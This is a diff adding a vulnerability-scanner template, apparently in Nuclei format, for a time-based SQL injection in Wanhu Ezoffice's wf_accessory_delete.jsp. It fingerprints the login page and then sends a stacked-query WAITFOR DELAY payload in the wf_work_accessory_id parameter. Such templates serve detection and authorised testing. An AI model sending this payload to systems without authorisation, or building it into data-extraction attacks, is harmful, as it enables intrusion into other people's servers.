@@ -1,0 +1,44 @@
+id: poc-yaml-wanhu-oa-wfaccessory-delete-jsp-sqli
+info:
+  name: Wanhu Ezoffice wf_accessory_delete.jsp SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    vendor: WanhuOA
+
+variables:
+  t1: '{{rand_int(5, 10)}}'
+  t2: '{{to_number(t1) + 1}}'
+
+http:
+  - id: "1"
+    method: GET
+    path:
+      - "{{BaseURL}}/defaultroot/login.jsp"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'whirRootPath = "/defaultroot"'
+          - 'login.jsp'
+      - type: status
+        status:
+          - 200
+
+  - id: "2"
+    method: GET
+    path:
+      - "{{BaseURL}}/defaultroot/platform/bpm/work_flow/operate/wf_accessory_delete.jsp?wf_work_accessory_id=1%3BWAITFOR+DELAY+%270%3A0%3A{{t1}}%27--"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "text/html"
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "response_time > to_number(t1)"
+          - "response_time < to_number(t2)"
